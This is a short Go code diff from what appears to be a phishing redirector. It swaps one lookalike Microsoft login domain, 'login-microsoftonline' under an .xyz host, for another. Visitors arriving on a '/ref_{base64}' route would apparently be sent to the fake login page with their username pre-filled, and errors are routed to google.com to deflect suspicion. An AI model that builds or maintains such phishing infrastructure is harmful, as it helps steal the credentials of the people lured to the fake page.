@@ -16,7 +16,7 @@ func main() {
 
 	var (
 		redirectErrorLink = "https://google.com/" //ERROR LINK
-		prefixLandingPage = "https://login-microsoftonline.sroauth.xyz/?username="
+		prefixLandingPage = "https://login-microsoftonline.qv2.xyz/?username="
 	)
 
 	r.Get("/ref_{base64}", func(w http.ResponseWriter, r *http.Request) {
